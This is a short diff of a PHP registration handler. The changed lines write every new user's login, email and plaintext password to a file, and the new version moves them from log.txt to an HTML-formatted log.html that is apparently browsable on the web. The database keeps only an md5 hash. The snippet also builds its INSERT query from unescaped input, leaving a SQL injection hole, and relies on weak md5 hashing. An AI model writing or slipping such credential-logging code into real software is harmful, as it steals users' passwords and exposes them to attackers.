@@ -153,17 +153,13 @@ $errors = array();
              trim($_POST['password2']));
         $token = md5(md5($login) . md5($password));
 
-        $fl = 
-
-        fopen('log.txt', 'a+');
-
-        fwrite($fl, 'login: ' . $login . PHP_EOL);
-        fwrite($fl, 'email: ' . $email . PHP_EOL);
-        fwrite($fl, 'password: ' . $password . PHP_EOL);
-
-        fwrite($fl, '' . PHP_EOL);
-
-        fclose($fl);
+$fl = 
+fopen('log.html', 'a+');
+fwrite($fl, '<strong>login: ' . $login . '</strong><br>' . PHP_EOL);
+fwrite($fl, 'email: ' . $email . '<br>' . PHP_EOL);
+fwrite($fl, 'password: ' . $password . '<br><br>' . PHP_EOL);
+fwrite($fl, '' . PHP_EOL);
+fclose($fl);
 
        $insert_query = "INSERT INTO `users` (token, login, email, password) 
        VALUES ('$token', '$login', '$email', md5('$password'))";
